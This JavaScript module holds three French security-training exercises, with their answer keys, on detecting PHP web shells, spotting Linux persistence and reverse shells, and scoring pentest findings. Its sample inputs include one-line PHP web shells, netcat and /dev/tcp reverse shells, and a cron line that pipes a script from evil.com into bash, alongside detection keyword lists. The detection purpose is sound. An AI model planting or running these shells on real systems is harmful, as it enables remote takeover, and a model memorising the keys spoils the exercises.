'use strict';

module.exports = [
  {
    "id": "hk3-c6-e1",
    "chapter": 6,
    "title": "Détecteur de Web Shells et Obfuscation de Scripts Malveillants",
    "level": "n1",
    "language": "analyse",
    "goal": "Analyser le code d'un script web pour repérer la présence de web shells et de mécanismes d'obfuscation.",
    "brief": "<p>Un web shell est un script déposé sur un serveur permettant à l'attaquant d'exécuter des commandes système à distance.<br><br>\nIndicateurs recherchés et scoring de dangerosité :<br>\n- Exécution de commandes système (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) : +40 points.<br>\n- Évaluation dynamique de code (<code>eval</code>, <code>assert</code>) : +30 points.<br>\n- Fonctions d'obfuscation (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) : +20 points.<br>\n- Réception directe d'entrées non filtrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) : +20 points.<br><br>\nClassification finale :<br>\n- Si <code>score &gt;= 60</code> : <code>status=MALICIOUS_WEBSHELL</code>, <code>risk=CRITICAL</code>.<br>\n- Si <code>20 &lt;= score &lt; 60</code> : <code>status=SUSPICIOUS_SCRIPT</code>, <code>risk=MEDIUM</code>.<br>\n- Si <code>score &lt; 20</code> : <code>status=BENIGN_CODE</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>SCAN_SCRIPT code=&lt;extrait_de_code&gt;</code>.<br>\nRésultat d’analyse attendu : <code>WEBSHELL_SCAN: score=&lt;score&gt; status=&lt;status&gt; risk=&lt;risk&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e1) — Détecteur de Web Shells et Obfuscation de Scripts Malveillants\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Web shell fortement obfusqué combinant eval, base64 et entrées POST]\n# Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST[\"payload\"])); ?>\nA_COMPLETER\n\n[Cas 2 — Script suspect utilisant uniquement base64_decode]\n# Données : SCAN_SCRIPT code=<?php $logo = base64_decode(\"iVBORw0KGgoAAAANSUhEUg==\"); ?>\nA_COMPLETER\n\n[Cas 3 — Script légitime de template sans fonction dangereuse]\n# Données : SCAN_SCRIPT code=<?php echo \"<h1>Bienvenue sur le portail</h1>\"; ?>\nA_COMPLETER\n",
    "hints": [
      "Extrayez le code après \"code=\" avec l’extraction des champs[1].",
      "Testez la présence des différentes familles de mots-clés.",
      "Attribuez la classification selon les seuils 60 et 20."
    ],
    "examples": [
      {
        "stdin": "SCAN_SCRIPT code=<?php if(isset($_REQUEST[\"cmd\"])){ system($_REQUEST[\"cmd\"]); } ?>",
        "expected": "WEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL",
        "note": "Web shell PHP classique à une ligne combinant system et $_REQUEST."
      }
    ],
    "tests": [
      {
        "label": "Web shell fortement obfusqué combinant eval, base64 et entrées POST",
        "stdin": "cas:1",
        "expected": "WEBSHELL_SCAN: score=70 status=MALICIOUS_WEBSHELL risk=CRITICAL"
      },
      {
        "label": "Script suspect utilisant uniquement base64_decode",
        "stdin": "cas:2",
        "expected": "WEBSHELL_SCAN: score=20 status=SUSPICIOUS_SCRIPT risk=MEDIUM"
      },
      {
        "label": "Script légitime de template sans fonction dangereuse",
        "stdin": "cas:3",
        "expected": "WEBSHELL_SCAN: score=0 status=BENIGN_CODE risk=LOW"
      }
    ],
    "solution": "[Exemple]\nWEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL\n\n[Cas 1 — Web shell fortement obfusqué combinant eval, base64 et entrées POST]\nWEBSHELL_SCAN: score=70 status=MALICIOUS_WEBSHELL risk=CRITICAL\n\n[Cas 2 — Script suspect utilisant uniquement base64_decode]\nWEBSHELL_SCAN: score=20 status=SUSPICIOUS_SCRIPT risk=MEDIUM\n\n[Cas 3 — Script légitime de template sans fonction dangereuse]\nWEBSHELL_SCAN: score=0 status=BENIGN_CODE risk=LOW"
  },
  {
    "id": "hk3-c6-e2",
    "chapter": 6,
    "title": "Analyseur de Persistance Linux (Crontab & Reverse Shells)",
    "level": "n2",
    "language": "analyse",
    "goal": "Auditer les mécanismes de persistance et détecter les commandes de shell inverse (Reverse Shell).",
    "brief": "<p>Après obtention d'un accès initial, l'attaquant configure une tâche planifiée ou un script de démarrage pour maintenir sa connexion.<br><br>\nSignatures d'attaques surveillées :<br>\n1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>\n2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>\n3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>\n4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>\nRègles de diagnostic :<br>\n- Si l'une des signatures est présente :<br>\n  <code>malicious=TRUE</code>, <code>signature=&lt;NOM_SIGNATURE&gt;</code>, <code>risk=CRITICAL</code>.<br>\n- Sinon :<br>\n  <code>malicious=FALSE</code>, <code>signature=CLEAN</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=&lt;TRUE|FALSE&gt; signature=&lt;sig&gt; risk=&lt;risk&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e2) — Analyseur de Persistance Linux (Crontab & Reverse Shells)\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\n# Données : PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001\nA_COMPLETER\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\n# Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash\nA_COMPLETER\n\n[Cas 3 — Tâche cron légitime de sauvegarde et synchronisation]\n# Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup\nA_COMPLETER\n",
    "hints": [
      "Extrayez la commande avec l’extraction des champs[1].",
      "Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.",
      "Formatez la sortie PERSIST_RESULT."
    ],
    "examples": [
      {
        "stdin": "PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "expected": "PERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL",
        "note": "Tâche cron récurrente établissant un reverse shell interactif vers l'attaquant."
      }
    ],
    "tests": [
      {
        "label": "Reverse shell netcat avec redirection de binaire shell",
        "stdin": "cas:1",
        "expected": "PERSIST_RESULT: type=SERVICE malicious=TRUE signature=NETCAT_REVERSE_SHELL risk=CRITICAL"
      },
      {
        "label": "Persistance par téléchargement et exécution de script distant",
        "stdin": "cas:2",
        "expected": "PERSIST_RESULT: type=CRON malicious=TRUE signature=DOWNLOAD_EXECUTE risk=CRITICAL"
      },
      {
        "label": "Tâche cron légitime de sauvegarde et synchronisation",
        "stdin": "cas:3",
        "expected": "PERSIST_RESULT: type=CRON malicious=FALSE signature=CLEAN risk=LOW"
      }
    ],
    "solution": "[Exemple]\nPERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\nPERSIST_RESULT: type=SERVICE malicious=TRUE signature=NETCAT_REVERSE_SHELL risk=CRITICAL\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\nPERSIST_RESULT: type=CRON malicious=TRUE signature=DOWNLOAD_EXECUTE risk=CRITICAL\n\n[Cas 3 — Tâche cron légitime de sauvegarde et synchronisation]\nPERSIST_RESULT: type=CRON malicious=FALSE signature=CLEAN risk=LOW"
  },
  {
    "id": "hk3-c6-e3",
    "chapter": 6,
    "title": "Générateur de Synthèse Managériale et Matrice de Risque de Pentest",
    "level": "n3",
    "language": "analyse",
    "goal": "Agréger les vulnérabilités découvertes, calculer le score de risque global et qualifier la posture de sécurité.",
    "brief": "<p>Le rapport d'intrusion conclut chaque mandat de pentest par une synthèse managériale (Executive Summary) et une matrice de sévérité.<br><br>\nPondération du score de risque :<br>\n- <code>CRITICAL</code> : 10 points chacun.<br>\n- <code>HIGH</code> : 5 points chacun.<br>\n- <code>MEDIUM</code> : 2 points chacun.<br>\n- <code>LOW</code> : 1 point chacun.<br>\n<code>risk_score = (C * 10) + (H * 5) + (M * 2) + (L * 1)</code>.<br><br>\nQualification de la posture globale de l'organisation :<br>\n1. Si <code>C &gt;= 1</code> ou <code>risk_score &gt;= 25</code> : <code>posture=COMPROMISED_CRITICAL</code>.<br>\n2. Sinon si <code>H &gt;= 2</code> ou <code>risk_score &gt;= 15</code> : <code>posture=HIGH_EXPOSURE</code>.<br>\n3. Sinon si <code>risk_score &gt;= 5</code> : <code>posture=MODERATE_EXPOSURE</code>.<br>\n4. Sinon : <code>posture=SECURE_RESILIENT</code>.<br><br>\nDonnées du cas : <code>PENTEST_SYNTHESIS findings=&lt;f1:sev1,f2:sev2,...&gt;</code>.<br>\nRésultat d’analyse attendu :<br>\n<code>PENTEST_SUMMARY: total_findings=&lt;N&gt; critical=&lt;C&gt; high=&lt;H&gt; medium=&lt;M&gt; low=&lt;L&gt; risk_score=&lt;score&gt; posture=&lt;posture&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e3) — Générateur de Synthèse Managériale et Matrice de Risque de Pentest\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Infrastructure avec failles élevées multiples sans faille critique]\n# Données : PENTEST_SYNTHESIS findings=xss_stored:HIGH,idor_api:HIGH,weak_password_policy:MEDIUM\nA_COMPLETER\n\n[Cas 2 — Environnement sain avec deux failles mineures d'en-tête]\n# Données : PENTEST_SYNTHESIS findings=missing_csp:LOW,server_banner:LOW\nA_COMPLETER\n\n[Cas 3 — Cumul de failles moyennes atteignant le seuil d'exposition modérée]\n# Données : PENTEST_SYNTHESIS findings=cors_wildcard:MEDIUM,rate_limit_bypass:MEDIUM,directory_listing:MEDIUM\nA_COMPLETER\n",
    "hints": [
      "Comptez les occurrences de CRITICAL, HIGH, MEDIUM, LOW dans findings.",
      "Calculez le score pondéré (10, 5, 2, 1).",
      "Appliquez les conditions de qualification de posture."
    ],
    "examples": [
      {
        "stdin": "PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW",
        "expected": "PENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL",
        "note": "Une vulnérabilité critique déclenche immédiatement la posture COMPROMISED_CRITICAL."
      }
    ],
    "tests": [
      {
        "label": "Infrastructure avec failles élevées multiples sans faille critique",
        "stdin": "cas:1",
        "expected": "PENTEST_SUMMARY: total_findings=3 critical=0 high=2 medium=1 low=0 risk_score=12 posture=HIGH_EXPOSURE"
      },
      {
        "label": "Environnement sain avec deux failles mineures d'en-tête",
        "stdin": "cas:2",
        "expected": "PENTEST_SUMMARY: total_findings=2 critical=0 high=0 medium=0 low=2 risk_score=2 posture=SECURE_RESILIENT"
      },
      {
        "label": "Cumul de failles moyennes atteignant le seuil d'exposition modérée",
        "stdin": "cas:3",
        "expected": "PENTEST_SUMMARY: total_findings=3 critical=0 high=0 medium=3 low=0 risk_score=6 posture=MODERATE_EXPOSURE"
      }
    ],
    "solution": "[Exemple]\nPENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL\n\n[Cas 1 — Infrastructure avec failles élevées multiples sans faille critique]\nPENTEST_SUMMARY: total_findings=3 critical=0 high=2 medium=1 low=0 risk_score=12 posture=HIGH_EXPOSURE\n\n[Cas 2 — Environnement sain avec deux failles mineures d'en-tête]\nPENTEST_SUMMARY: total_findings=2 critical=0 high=0 medium=0 low=2 risk_score=2 posture=SECURE_RESILIENT\n\n[Cas 3 — Cumul de failles moyennes atteignant le seuil d'exposition modérée]\nPENTEST_SUMMARY: total_findings=3 critical=0 high=0 medium=3 low=0 risk_score=6 posture=MODERATE_EXPOSURE"
  }
];
